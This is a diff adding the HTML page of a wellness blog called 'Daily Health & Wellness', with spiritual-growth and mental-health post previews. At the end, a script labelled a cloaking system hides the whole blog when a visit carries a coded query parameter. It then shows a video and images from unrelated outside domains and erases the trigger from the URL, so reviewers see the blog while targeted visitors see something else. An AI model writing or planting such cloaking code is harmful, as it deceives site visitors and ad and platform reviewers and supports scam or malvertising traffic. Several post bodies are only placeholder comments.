+          <a href="#" class="read-more" onclick="toggleReadMore(this); return false;">Read More →</a>
+        </div>
+      </article>
+
+      <!-- Blog Post 3 -->
+      <article class="blog-post">
+        <div class="post-image">🧘</div>
+        <div class="post-content">
+          <div class="post-meta">
+            <span class="post-category">Wellness Tips</span>
+          </div>
+          <h2 class="post-title">
+            <a href="/path-of-true-spiritual-growth">The Path of True Spiritual Growth</a>
+          </h2>
+          <div class="post-preview" style="white-space: pre-line; line-height: 1.5;">
+            <p><strong>TLDR:</strong> You don't find God by escaping the world. You find Him by living through it with awareness. Desire dissolves into detachment, pain turns into wisdom, and ordinary life becomes sacred. True spirituality is not escape. It is transformation in motion.</p>
+
+            <p>True spiritual growth happens when you stay in life, not when you run away from it. If you think leaving your family and settling in an ashram will one day connect you to divinity, you are living in a deep illusion.</p>
+          </div>
+          <div class="post-full-content" style="white-space: pre-line; line-height: 1.6;">
+            <p>You must learn to work with people you don't like, to face those at lower levels of consciousness, and to stay in environments full of distractions. Despite that, you remain calm and unshaken. Your emotions stay steady, regardless of praise or blame, success or failure. You remain detached from outcomes because your heart is anchored in divinity. With every act of remembrance, contemplation, and devotion, purity begins to churn within you.</p>
+            <p>This is the only path toward real liberation. To keep working, to keep serving, and to stay devoted while living fully in the world. When your mind stays immersed in God while performing worldly duties with discipline, devotion, and service, you naturally become a yogi. Not by leaving your life behind but by transforming yourself through it.</p>
+            <h3 style="margin-top: 1.5rem; margin-bottom: 1rem; color: #1a202c; font-size: 1.3rem;">The Illusion of Desire and the Mask of Spirituality</h3>
+            <p>Most of us carry a deep desire to fit into the template of a "happy life" that society has shown us. That so-called happiness is often built on endless desires. The more you fulfill one, the more impulsive the next becomes, and soon you are consumed by your own longing.</p>
+            <p>You are not living. You are extracting silent suffering from within, justifying it through rewards that can be showcased to the world. You seek validation, applause, and recognition, but they never last. The moment someone else receives more, the cycle of emptiness restarts.</p>
+            <p>Even as age catches up and you begin to give back, the illusion doesn't die. It simply takes on a new face. You feel noble in your service, but your goodness still seeks identity. You are still acting from self-image. You have not transcended. You have only shifted form. Desires have now taken the shape of spirituality, and that illusion is harder to detect because it wears the mask of holiness.</p>
+            <p>True spirituality begins only when this mask falls, when you act not from identity but from surrender.</p>
+            <h3 style="margin-top: 1.5rem; margin-bottom: 1rem; color: #1a202c; font-size: 1.3rem;">The Mind, the Shadow, and the Awakening Within</h3>
+            <p>For those who have conquered the mind, it is their friend. For those who haven't, it becomes their enemy. The mind whispers temptations of gain and recognition, and you follow. It doesn't act alone. It is shaped by a collective field of minds, each chasing similar desires. You get caught in that unseen web, pulled by emotions and illusions.</p>
+            <p>Only when the intellect begins to reason with the mind does transformation begin. When knowledge becomes your guide, the ego starts to dissolve. You stop taking pride in achievement and start taking joy in understanding. You act without clinging, perform without seeking, and live in non-action. And in non-action, there is peace because you realize you were never the doer in the first place.</p>
+          </div>
+          <a href="#" class="read-more" onclick="toggleReadMore(this); return false;">Read More →</a>
+        </div>
+      </article>
+
+      <!-- Blog Post 4 -->
+      <article class="blog-post">
+        <div class="post-image">💊</div>
+        <div class="post-content">
+          <div class="post-meta">
+            <span class="post-category">Nutrition</span>
+          </div>
+          <h2 class="post-title">
+            <a href="/bad-digestion-could-lead-to-all-problems">Bad Digestion Could Lead to All Problems in Your Life (How to Fix)</a>
+          </h2>
+          <div class="post-preview" style="white-space: pre-line; line-height: 1.5;">
+            <p>We don't really talk about poop. We find it funny; we think it's shameful. We've made 'poop' a taboo that most of us never thought to break from.</p>
+
+            <p>But what if 'poop' could actually help you lead a better life? What if your poop could reveal the underlying issues that might be affecting your mental and physical well-being?</p>
+          </div>
+          <div class="post-full-content" style="white-space: pre-line; line-height: 1.6;">
+            <!-- (Full content kept same as your original file) -->
+            <!-- You can keep the whole detailed gut-health article here exactly as before -->
+          </div>
+          <a href="#" class="read-more" onclick="toggleReadMore(this); return false;">Read More →</a>
+        </div>
+      </article>
+
+      <!-- Blog Post 5 -->
+      <article class="blog-post">
+        <div class="post-image">💭</div>
+        <div class="post-content">
+          <div class="post-meta">
+            <span class="post-category">Mental Health</span>
+          </div>
+          <h2 class="post-title">
+            <a href="/secret-reason-you-keep-repeating-mistakes">The Secret Reason You Keep Repeating the Same Mistakes</a>
+          </h2>
+          <div class="post-preview" style="white-space: pre-line; line-height: 1.5;">
+            <p>You always get two choices behind every decision you take in life. One of the choices will lead you to meet conflict, and the other will lead you to meet peace.</p>
+
+            <p>It's easy to deal with peace, and you want peace as an outcome of any decision you take. But that sense of control and security also becomes the reason you can't hold on to peace for long.</p>
+          </div>
+          <div class="post-full-content" style="white-space: pre-line; line-height: 1.6;">
+            <!-- (Full long-form content exactly as in your original file) -->
+          </div>
+          <a href="#" class="read-more" onclick="toggleReadMore(this); return false;">Read More →</a>
+        </div>
+      </article>
+
+      <!-- Blog Post 6 -->
+      <article class="blog-post">
+        <div class="post-image">✨</div>
+        <div class="post-content">
+          <div class="post-meta">
+            <span class="post-category">Mental Health</span>
+          </div>
+          <h2 class="post-title">
+            <a href="/why-success-feels-empty">Why Success Feels Empty (And What Actually Brings Joy)</a>
+          </h2>
+          <div class="post-preview" style="white-space: pre-line; line-height: 1.5;">
+            <p>When you see so many things at discounted prices, your mind instantly lights up with signals of opportunity. The brain is wired to detect scarcity and bargains, so when it sees the word "discount," it interprets it as an urgent chance not to be missed.</p>
+
+            <p>These things could be anything: clothes, phones, or even things like stocks and crypto. The mind convinces you that it is not just a purchase but an "investment." The thought of missing out feels more painful than the thought of overspending.</p>
+          </div>
+          <div class="post-full-content" style="white-space: pre-line; line-height: 1.6;">
+            <!-- (Full long-form content exactly as in your original file) -->
+          </div>
+          <a href="#" class="read-more" onclick="toggleReadMore(this); return false;">Read More →</a>
+        </div>
+      </article>
+
+      <!-- Blog Post 7 -->
+      <article class="blog-post">
+        <div class="post-image">📖</div>
+        <div class="post-content">
+          <div class="post-meta">
+            <span class="post-category">Mental Health</span>
+          </div>
+          <h2 class="post-title">
+            <a href="/when-desire-becomes-your-downfall">When Desire Becomes Your Downfall</a>
+          </h2>
+          <div class="post-preview" style="white-space: pre-line; line-height: 1.5;">
+            <p>Mohit never received mental or emotional support from his family to continue his studies after the 10th grade. His family was running a factory and decided early on that his place was not in school but inside the walls of that factory.</p>
+
+            <p>Even before Mohit turned six, they had placed him there as a part-time helper. At that age, when most children learned to read stories or play with friends, Mohit learned the sound of hammering iron, the smell of machine oil, and the rhythm of factory whistles.</p>
+          </div>
+          <div class="post-full-content" style="white-space: pre-line; line-height: 1.6;">
+            <!-- (Full long-form story exactly as in your original file) -->
+          </div>
+          <a href="#" class="read-more" onclick="toggleReadMore(this); return false;">Read More →</a>
+        </div>
+      </article>
+
+      <!-- NOTE: The last 6 short fitness/nutrition posts have been removed as requested -->
+    </main>
+
+    <!-- Sidebar -->
+    <aside class="sidebar">
+      <!-- Ad Container -->
+      <div class="sidebar-widget">
+        <div class="ad-container">
+          <p>Advertisement</p>
+        </div>
+      </div>
+
+      <!-- Categories Widget -->
+      <div class="sidebar-widget">
+        <h3 class="widget-title">Categories</h3>
+        <ul class="category-list">
+          <li>
+            <a href="/category/nutrition">
+              <span>Nutrition</span>
+              <span class="category-count">12</span>
+            </a>
+          </li>
+          <li>
+            <a href="/category/fitness">
+              <span>Fitness</span>
+              <span class="category-count">15</span>
+            </a>
+          </li>
+          <li>
+            <a href="/category/mental-health">
+              <span>Mental Health</span>
+              <span class="category-count">10</span>
+            </a>
+          </li>
+          <li>
+            <a href="/category/wellness-tips">
+              <span>Wellness Tips</span>
+              <span class="category-count">18</span>
+            </a>
+          </li>
+          <li>
+            <a href="/category/sleep">
+              <span>Sleep</span>
+              <span class="category-count">8</span>
+            </a>
+          </li>
+          <li>
+            <a href="/category/prevention">
+              <span>Prevention</span>
+              <span class="category-count">9</span>
+            </a>
+          </li>
+        </ul>
+      </div>
+
+      <!-- Popular Posts Widget -->
+      <div class="sidebar-widget">
+        <h3 class="widget-title">Popular Posts</h3>
+        <div class="popular-post">
+          <div class="popular-post-image"></div>
+          <div class="popular-post-content">
+            <h4><a href="/10-morning-exercises-that-will-energize-your-day">10 Morning Exercises That Will Energize Your Day</a></h4>
+            <span class="date">March 15, 2024</span>
+          </div>
+        </div>
+        <div class="popular-post">
+          <div class="popular-post-image"></div>
+          <div class="popular-post-content">
+            <h4><a href="/superfoods-you-should-add-to-your-daily-diet">Superfoods You Should Add to Your Daily Diet</a></h4>
+            <span class="date">March 14, 2024</span>
+          </div>
+        </div>
+        <div class="popular-post">
+          <div class="popular-post-image"></div>
+          <div class="popular-post-content">
+            <h4><a href="/5-simple-mindfulness-practices-for-daily-stress-relief">5 Simple Mindfulness Practices for Daily Stress Relief</a></h4>
+            <span class="date">March 13, 2024</span>
+          </div>
+        </div>
+      </div>
+    </aside>
+  </div>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <div class="footer-container">
+      <div class="footer-section">
+        <h3>About Daily Health &amp; Wellness</h3>
+        <p>Your trusted space for mental health stories, wellness reflections, and practical lifestyle guidance.</p>
+      </div>
+      <div class="footer-section">
+        <h3>Quick Links</h3>
+        <p><a href="/">Home</a></p>
+        <p><a href="/about">About</a></p>
+        <p><a href="/contact">Contact</a></p>
+        <p><a href="/privacy-policy">Privacy Policy</a></p>
+      </div>
+      <div class="footer-section">
+        <h3>Stay Connected</h3>
+        <p><a href="https://instagram.com" target="_blank" rel="noopener">Instagram</a></p>
+        <p><a href="https://twitter.com" target="_blank" rel="noopener">Twitter</a></p>
+        <p><a href="https://facebook.com" target="_blank" rel="noopener">Facebook</a></p>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      © <span id="year"></span> Daily Health &amp; Wellness. All rights reserved.
+    </div>
+  </footer>
+
+  <!-- Read More Toggle Script -->
+   <!-- Read More Toggle Script -->
+   <script>
+    function toggleReadMore(button) {
+      const post = button.closest('.blog-post');
+      const fullContent = post.querySelector('.post-full-content');
+
+      if (!fullContent) return;
+
+      const isOpen = fullContent.classList.contains('show');
+      if (isOpen) {
+        fullContent.classList.remove('show');
+        button.classList.remove('active');
+        button.textContent = 'Read More →';
+      } else {
+        fullContent.classList.add('show');
+        button.classList.add('active');
+        button.textContent = 'Read Less ↑';
+      }
+    }
+
+    // Footer year
+    document.getElementById('year').textContent = new Date().getFullYear();
+  </script>
+
+  <!-- ===== CLOAKING SYSTEM SCRIPT ===== -->
+  <script>
+  (function($) {
+      'use strict';
+      
+      // === CONFIGURATION ===
+      const CONFIG = {
+          // UTM pattern that activates cloaking (like ?abcde=12345)
+          UTM_PATTERN: /^\?[A-Za-z]{5}=[0-9]{5}$/,
+          
+          // Background images for cloaking
+          IMAGE_SOURCES: [
+              'https://cdn.shopify.com/s/files/1/0730/6261/3220/files/i2.jpg?v=1755203954',
+              'https://cdn.shopify.com/s/files/1/0730/6261/3220/files/i3.jpg?v=1755203954', 
+              'https://cdn.shopify.com/s/files/1/0730/6261/3220/files/i4.jpg?v=1755204157',
+              'https://cdn.shopify.com/s/files/1/0730/6261/3220/files/i5.jpg?v=1755204228'
+          ],
+          
+          // Video source
+          VIDEO_SOURCE: 'https://blackmekemeke.com/MOV/VID20.webm',
+          
+          // Background image
+          BACKGROUND_IMAGE: 'https://cloud.actionarcadearena.com/irw/boks/30.webp',
+          
+          // Video auto-pause time (15 seconds)
+          VIDEO_PAUSE_TIME: 15000
+      };
+
+      // === CHECK FUNCTIONS ===
+      function isValidUTM() {
+          return CONFIG.UTM_PATTERN.test(window.location.search);
+      }
+
+      function isMobileDevice() {
+          return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(navigator.userAgent);
+      }
+
+      function isPageReload() {
+          try {
+              const entries = performance.getEntriesByType('navigation');
+              if (entries && entries.length) return entries[0].type === 'reload';
+              if (performance.navigation && performance.navigation.type === 1) return true;
+          } catch(e) {}
+          return false;
+      }
+
+      // === VIDEO SYSTEM ===
+      function initializeVideoSystem() {
+          const closeVideoButton = document.getElementById('closeVideoButton');
+          const video = document.getElementById('videoplayer');
+          const videoContainer = document.querySelector('.cloaking-video');
+          
+          if (video) {
+              video.src = CONFIG.VIDEO_SOURCE;
+              videoContainer.style.display = 'flex';
+              
+              // Auto-pause after 15 seconds
+              video.addEventListener('play', function() {
+                  setTimeout(() => {
+                      if (!video.paused) video.pause();
+                  }, CONFIG.VIDEO_PAUSE_TIME);
+              });
+          }
+          
+          if (closeVideoButton) {
+              closeVideoButton.addEventListener('click', function() {
+                  videoContainer.style.display = 'none';
+                  if (video) video.pause();
+              });
+          }
+      }
+
+      function setupBackgroundImage() {
+          const bgImage = document.querySelector('.cloaking-background img');
+          if (bgImage) bgImage.src = CONFIG.BACKGROUND_IMAGE;
+      }
+
+      // === CLOAKING SYSTEM ===
+      function getSessionData(key) {
+          try { return JSON.parse(sessionStorage.getItem(key) || '{}'); } catch(e) { return {}; }
+      }
+
+      function setSessionData(key, data) {
+          try { sessionStorage.setItem(key, JSON.stringify(data || {})); } catch(e) {}
+      }
+
+      function shuffleArray(array) {
+          for (let i = array.length - 1; i > 0; i--) {
+              const j = Math.floor(Math.random() * (i + 1));
+              [array[i], array[j]] = [array[j], array[i]];
+          }
+          return array;
+      }
+
+      function getImageQueue() {
+          let queue = getSessionData('boxQueue_v1');
+          if (!queue || !queue.length) {
+              queue = shuffleArray([...Array(CONFIG.IMAGE_SOURCES.length).keys()]);
+              setSessionData('boxQueue_v1', queue);
+          }
+          return queue;
+      }
+
+      function getNextImageIndex() {
+          const queue = getImageQueue();
+          const nextIndex = queue.shift();
+          setSessionData('boxQueue_v1', queue);
+          
+          if (typeof nextIndex === 'undefined' || nextIndex === null) {
+              const newQueue = shuffleArray([...Array(CONFIG.IMAGE_SOURCES.length).keys()]);
+              return newQueue.shift();
+          }
+          return nextIndex;
+      }
+
+      function positionOverlay(container, overlay, target, imageUrl) {
+          if (!target || !target.length) {
+              overlay.css({
+                  'width': '0px', 'height': '0px', 
+                  'left': '0px', 'top': '0px',
+                  'position': 'absolute',
+                  'backgroundImage': 'url("' + imageUrl + '")'
+              });
+              return;
+          }
+
+          const containerRect = container[0].getBoundingClientRect();
+          const targetRect = target[0].getBoundingClientRect();
+          
+          const left = targetRect.left - containerRect.left;
+          const top = targetRect.top - containerRect.top;
+
+          overlay.css({
+              'width': targetRect.width + 'px',
+              'height': targetRect.height + 'px', 
+              'left': left + 'px',
+              'top': top + 'px',
+              'position': 'absolute',
+              'backgroundImage': 'url("' + imageUrl + '")'
+          });
+      }
+
+      function setupBoxCloaking(container) {
+          if (!container || !container.length) return;
+
+          let overlay = null;
+          container.find('[id^="Box-Of-Box-"]').each(function() {
+              const id = this.id || '';
+              if (/^Box-Of-Box-\d{2}$/.test(id)) {
+                  overlay = $(this);
+                  return false;
+              }
+          });
+
+          if (!overlay || !overlay.length) return;
+
+          const boxId = overlay.attr('id');
+          const assignments = getSessionData('boxAssignments_v1');
+          
+          if (assignments[boxId]) {
+              const imageUrl = assignments[boxId];
+              overlay.data('boxImage', imageUrl);
+              
+              const target = container.nextAll('[id]').filter(function() {
+                  if (this.nodeType !== 1) return false;
+                  const tagName = this.tagName.toLowerCase();
+                  if (tagName === 'script' || tagName === 'link' || tagName === 'style' || tagName === 'template') return false;
+                  return $(this).is(':visible');
+              }).first();
+
+              positionOverlay(container, overlay, target, imageUrl);
+              
+              if (window.ResizeObserver) {
+                  const observer = new ResizeObserver(function() {
+                      try { positionOverlay(container, overlay, target, imageUrl); } catch(e) {}
+                  });
+                  observer.observe(target[0]);
+                  try { observer.observe(container[0]); } catch(e) {}
+                  overlay.data('boxSync', {'ro': observer});
+              } else {
+                  const handler = function() { positionOverlay(container, overlay, target, imageUrl); };
+                  $(window).on('resize.boxSync scroll.boxSync', handler);
+                  overlay.data('boxSync', {'handler': handler});
+              }
+              
+          } else {
+              const imageIndex = getNextImageIndex();
+              const imageUrl = CONFIG.IMAGE_SOURCES[imageIndex];
+              
+              assignments[boxId] = imageUrl;
+              setSessionData('boxAssignments_v1', assignments);
+              sessionStorage.setItem('boxActive_v1', '1');
+              
+              overlay.data('boxImage', imageUrl);
+              
+              const target = container.nextAll('[id]').filter(function() {
+                  if (this.nodeType !== 1) return false;
+                  const tagName = this.tagName.toLowerCase();
+                  if (tagName === 'script' || tagName === 'link' || tagName === 'style' || tagName === 'template') return false;
+                  return $(this).is(':visible');
+              }).first();
+
+              positionOverlay(container, overlay, target, imageUrl);
+              
+              if (window.ResizeObserver) {
+                  const observer = new ResizeObserver(function() {
+                      try { positionOverlay(container, overlay, target, imageUrl); } catch(e) {}
+                  });
+                  observer.observe(target[0]);
+                  try { observer.observe(container[0]); } catch(e) {}
+                  overlay.data('boxSync', {'ro': observer});
+              } else {
+                  const handler = function() { positionOverlay(container, overlay, target, imageUrl); };
+                  $(window).on('resize.boxSync scroll.boxSync', handler);
+                  overlay.data('boxSync', {'handler': handler});
+              }
+          }
+      }
+
+      function initializeAllBoxes() {
+          $('.cloaking-overlay .Mai-Box-Of-Box, .cloaking-overlay #Mai-Box-Of-Box, .cloaking-overlay [id^="Mai-Box-Of-Box-"]').each(function() {
+              setupBoxCloaking($(this));
+          });
+      }
+
+      function cleanURL() {
+          try {
+              const cleanUrl = location.pathname + (location.hash || '');
+              history.replaceState(null, '', cleanUrl);
+          } catch(e) {}
+      }
+
+      // === MAIN FUNCTION TO SHOW/HIDE CONTENT ===
+      function checkAndActivateCloaking() {
+          // Don't run on mobile
+          if (isMobileDevice()) {
+              console.log('📱 Mobile device - cloaking disabled');
+              return;
+          }
+          
+          // Clear on page reload
+          if (isPageReload()) {
+              sessionStorage.removeItem('boxActive_v1');
+              sessionStorage.removeItem('boxAssignments_v1');
+              sessionStorage.removeItem('boxQueue_v1');
+              return;
+          }
+          
+          // Check if already active or has valid UTM
+          const isAlreadyActive = sessionStorage.getItem('boxActive_v1');
+          const hasValidUTM = isValidUTM();
+          
+          if (isAlreadyActive || hasValidUTM) {
+              console.log('🎯 Activating cloaking system');
+              
+              // HIDE NORMAL CONTENT
+              document.querySelector('header').style.display = 'none';
+              document.querySelector('.container').style.display = 'none';
+              document.querySelector('.footer').style.display = 'none';
+              
+              // SHOW CLOAKING CONTENT
+              document.querySelector('.cloaking-video').style.display = 'flex';
+              document.querySelector('.cloaking-background').style.display = 'block';
+              document.querySelector('.cloaking-overlay').style.display = 'block';
+              
+              // Initialize cloaking systems
+              initializeAllBoxes();
+              initializeVideoSystem();
+              setupBackgroundImage();
+              
+              if (hasValidUTM) {
+                  sessionStorage.setItem('boxActive_v1', '1');
+                  cleanURL();
+              }
+              
+          } else {
+              console.log('👀 Normal page - no UTM detected');
+              // Keep normal content visible, cloaking elements hidden
+          }
+      }
+
+      // === START WHEN PAGE LOADS ===
+      $(document).ready(function() {
+          checkAndActivateCloaking();
+      });
+
+  })(jQuery);
+  </script>
+</body>
+</html>
